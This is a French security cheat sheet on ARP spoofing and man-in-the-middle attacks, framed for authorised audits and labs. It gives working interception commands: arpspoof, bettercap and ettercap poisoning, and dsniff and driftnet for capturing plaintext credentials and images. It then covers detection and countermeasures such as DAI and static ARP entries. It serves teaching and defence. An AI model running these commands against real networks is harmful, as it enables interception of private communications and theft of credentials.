# Cheat Sheet : ARP Spoofing & MitM — Empoisonnement, Interception & Détection

!!! warning "Cadre légal"
    Les techniques décrites sont à utiliser **uniquement dans le cadre d'un audit de sécurité contractuel ou d'un lab personnel**. L'interception de communications sans autorisation est pénalement réprimée (article 226-15 du Code pénal en France, CFAA aux États-Unis).

---

## 1. Théorie — Mécanisme de l'ARP Poisoning

### Fonctionnement du protocole ARP
```
ARP (Address Resolution Protocol) : traduit une adresse IP en adresse MAC sur le LAN.

Problème fondamental : ARP est sans état et sans authentification.
→ N'importe quel hôte peut envoyer une réponse ARP non sollicitée (Gratuitous ARP)
→ Le système récepteur met à jour sa table ARP sans vérification
→ La table ARP peut donc être empoisonnée à volonté par un attaquant sur le même segment
```

### Scénario MitM (Man-in-the-Middle)
```
Réseau cible :
  Victime     : 192.168.1.50   MAC: AA:AA:AA:AA:AA:AA
  Passerelle  : 192.168.1.1    MAC: BB:BB:BB:BB:BB:BB
  Attaquant   : 192.168.1.100  MAC: CC:CC:CC:CC:CC:CC

Avant l'attaque :
  Table ARP Victime    → 192.168.1.1   = BB:BB:BB:BB:BB:BB  (légitime)
  Table ARP Passerelle → 192.168.1.50  = AA:AA:AA:AA:AA:AA  (légitime)

Après empoisonnement :
  Table ARP Victime    → 192.168.1.1   = CC:CC:CC:CC:CC:CC  (attaquant)
  Table ARP Passerelle → 192.168.1.50  = CC:CC:CC:CC:CC:CC  (attaquant)

Résultat : tout le trafic Victime ↔ Passerelle transite par l'attaquant
```

---

## 2. Mise en Œuvre Pratique

### Prérequis : activation du forwarding IP
```bash
# Activer le transfert IP pour que l'attaquant relaie le trafic sans couper la connexion
sysctl -w net.ipv4.ip_forward=1
```

```bash
# Vérifier l'état du forwarding IP (1 = activé)
cat /proc/sys/net/ipv4/ip_forward
```

!!! warning "Forwarding IP obligatoire avant de commencer"
    Sans `ip_forward=1`, la victime perd sa connexion réseau dès l'empoisonnement (les paquets arrivent chez l'attaquant mais ne sont pas retransmis à la passerelle). Cela rend l'attaque détectable immédiatement. Activer le forwarding **avant** de lancer le spoofing.

### `arpspoof` (suite dsniff) — Interception bidirectionnelle
```bash
# Terminal 1 : empoisonne la table ARP de la victime
# "la passerelle 192.168.1.1, c'est moi"
arpspoof -i eth0 -t 192.168.1.50 192.168.1.1
```

```bash
# Terminal 2 : empoisonne la table ARP de la passerelle
# "la victime 192.168.1.50, c'est moi"
arpspoof -i eth0 -t 192.168.1.1 192.168.1.50
```

### `bettercap` — Spoofing automatisé avec inspection de trafic
```bash
# Lancer bettercap sur l'interface réseau
sudo bettercap -iface eth0
```

```bash
# Dans l'interface interactive bettercap :
net.probe on                           # découverte des hôtes du réseau
net.show                               # liste les hôtes détectés
set arp.spoof.targets 192.168.1.50    # cible l'hôte victime uniquement
arp.spoof on                          # active l'empoisonnement ARP
net.sniff on                          # capture et affiche le trafic intercepté
```

### `ettercap` — Interface TUI/GUI alternative
```bash
# Mode ligne de commande : MitM ARP entre une cible et la passerelle (// = tout le réseau)
ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1//
```

---

## 3. Interception & Attaques Dérivées

### Capture de credentials en clair
```bash
# dsniff : extrait automatiquement les credentials de protocoles en clair (FTP, Telnet, HTTP Basic...)
dsniff -i eth0
```

```bash
# driftnet : capture et affiche les images transitant en clair sur le réseau
driftnet -i eth0
```

### Synthèse — Outils d'interception MitM

| Outil | Rôle | Protocoles ciblés |
| --- | --- | --- |
| `arpspoof` | Empoisonnement ARP brut | — |
| `bettercap` | MitM tout-en-un + sniffing + injection | HTTP, HTTPS, DNS, etc. |
| `ettercap` | MitM + sniffing + plugins | FTP, HTTP, SSH (downgrade) |
| `dsniff` | Extraction de credentials en clair | FTP, Telnet, SMTP, HTTP Basic |
| `driftnet` | Extraction d'images du trafic HTTP | HTTP |
| `tcpdump` | Capture brute du trafic intercepté | Tous |
| `Wireshark` | Analyse approfondie du PCAP capturé | Tous |

### Downgrade HTTP & SSLStrip (concept)
```
SSLStrip (Moxie Marlinspike, 2009) :
  1. L'attaquant intercepte les redirections HTTPS (301/302 de HTTP → HTTPS)
  2. Maintient une connexion HTTPS avec le serveur
  3. Sert la réponse en HTTP en clair à la victime
  → La victime communique en HTTP, l'attaquant voit tout

Limites modernes :
  - HSTS (HTTP Strict Transport Security) : empêche le downgrade sur les sites qui l'implémentent
  - HSTS Preloading : liste de domaines HTTPS-only gravée dans les navigateurs
  → SSLStrip est inefficace sur les domaines avec HSTS préchargé
```

---

## 4. Détection, Forensics & Contre-mesures

### Détection en CLI
```bash
# Inspecter la table ARP locale : une même MAC pour deux IPs = signal d'empoisonnement
arp -a
ip neighbor
```

```bash
# Surveiller les annonces ARP en temps réel
tcpdump -i eth0 arp
```

```bash
# Filtrer spécifiquement les réponses ARP gratuites non sollicitées (opcode=2)
tcpdump -i eth0 -nn "arp[6:2] == 2"
```

### Détection dans Wireshark
```
Filtre : arp.duplicate-address-frame
  → Détecte les conflits d'adresse MAC (2 hôtes différents annoncent la même IP)

Filtre : arp.src.hw_mac != eth.src
  → La MAC annoncée dans la réponse ARP ≠ la MAC source Ethernet : signature d'usurpation

Filtre : arp.opcode == 2 && arp.isgratuitous
  → Réponses ARP gratuites non sollicitées (Gratuitous ARP)
```

### Contre-mesures défensives

| Contre-mesure | Mécanisme | Niveau |
| --- | --- | --- |
| **Entrées ARP statiques** | Lie manuellement IP ↔ MAC pour les hôtes critiques | Hôte |
| **Dynamic ARP Inspection (DAI)** | Le switch vérifie chaque réponse ARP par rapport à la table DHCP Snooping — rejette les entrées invalides | Switch manageable |
| **DHCP Snooping** | Pré-requis de DAI : seuls les ports "trusted" peuvent répondre aux requêtes DHCP | Switch manageable |
| **Chiffrement E2E (TLS)** | Limite l'impact d'une interception réussie : les données restent chiffrées même si le trafic est capturé | Application |
| **HSTS / HSTS Preload** | Empêche le downgrade HTTP → SSLStrip inefficace | Serveur web |
| **Segmentation VLAN** | Isole les hôtes critiques sur des segments distincts, limite la portée de l'attaque (ARP = LAN uniquement) | Infrastructure |

```bash
# Ajouter une entrée ARP statique permanente (résiste à l'empoisonnement)
ip neighbor add 192.168.1.1 lladdr BB:BB:BB:BB:BB:BB dev eth0 nud permanent
```

!!! tip "Audit de sécurité ARP : checklist rapide"
    1. `arp -a` → MAC en double sur des IPs différentes ?
    2. `tcpdump -i eth0 arp` → Gratuitous ARP inattendus ?
    3. Wireshark → filtre `arp.duplicate-address-frame` sur un PCAP réseau
    4. Switch manageable → DAI activé sur tous les ports untrusted ?
    5. Hôtes critiques → entrées ARP statiques configurées ?
